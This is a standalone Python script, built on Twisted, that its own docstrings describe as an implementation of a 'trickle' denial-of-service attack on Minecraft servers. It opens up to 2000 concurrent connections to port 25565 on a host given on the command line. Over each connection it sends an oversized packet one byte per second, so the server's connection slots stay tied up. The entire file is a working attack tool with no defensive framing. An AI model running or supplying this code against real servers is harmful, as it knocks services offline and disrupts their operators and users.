#!/usr/bin/env python

from optparse import OptionParser
import random
import string
import sys

usage = """usage: %prog [options] host

I am quite noisy by default; consider redirecting or filtering my output."""

parser = OptionParser(usage)
parser.add_option("-c", "--count",
    dest="count",
    type="int",
    default=2000,
    metavar="COUNT",
    help="Number of connections to spawn",
)
options, arguments = parser.parse_args()
if len(arguments) != 1:
    parser.error("Need exactly one argument")

# Use poll(). To use another reactor, just change these lines.
# OSX users probably want to pick another reactor. (Or maybe another OS!)
from twisted.internet import pollreactor
pollreactor.install()

from twisted.internet import reactor
from twisted.internet.protocol import Factory, Protocol
from twisted.internet.endpoints import TCP4ClientEndpoint
from twisted.internet.task import LoopingCall
from twisted.python import log

log.startLogging(sys.stdout)

class TrickleProtocol(Protocol):
    """
    Implementation of the "trickle" DoS attack on MC servers.
    """

    def __init__(self):
        """
        Prepare our payload.
        """

        self.payload = "\x02\xff\xff" + "".join(
            random.choice(string.printable) for i in range(65335))
        self.index = 0

    def connectionMade(self):
        """
        Send our payload at an excrutiatingly slow pace.
        """

        self.loop = LoopingCall(self.sendchar)
        self.loop.start(1)

    def sendchar(self):
        """
        Send a single character down the pipe.
        """

        self.transport.write(self.payload[self.index])
        self.index += 1
        if self.index >= len(self.payload):
            # Just stop and wait to get reaped.
            self.loop.stop()

    def connectionLost(self, reason):
        """
        Remove ourselves from the factory.
        """

        self.factory.connections.discard(self)

class TrickleFactory(Factory):
    """
    Factory for maintaining a certain number of open connections.
    """

    protocol = TrickleProtocol

    def __init__(self, count):
        self.max_connections = count

        self.connections = set()
        self.pending = set()
        self.endpoint = TCP4ClientEndpoint(reactor, arguments[0], 25565)

        LoopingCall(self.log_status).start(1)

    def spawn_connection(self):
        d = self.endpoint.connect(self)
        self.pending.add(d)

        def cb(protocol):
            self.pending.discard(d)
            self.connections.add(protocol)
        d.addCallback(cb)

    def log_status(self):
        log.msg("%d active connections, %d pending connections" %
            (len(self.connections), len(self.pending)))

        if len(self.connections) + len(self.pending) < self.max_connections:
            count = self.max_connections - len(self.connections) + len(self.pending)
            count = min(100, max(0, count))
            for i in range(count):
                self.spawn_connection()

log.msg("Trickling against %s" % arguments[0])
log.msg("Running with up to %d connections" % options.count)
factory = TrickleFactory(options.count)
reactor.run()
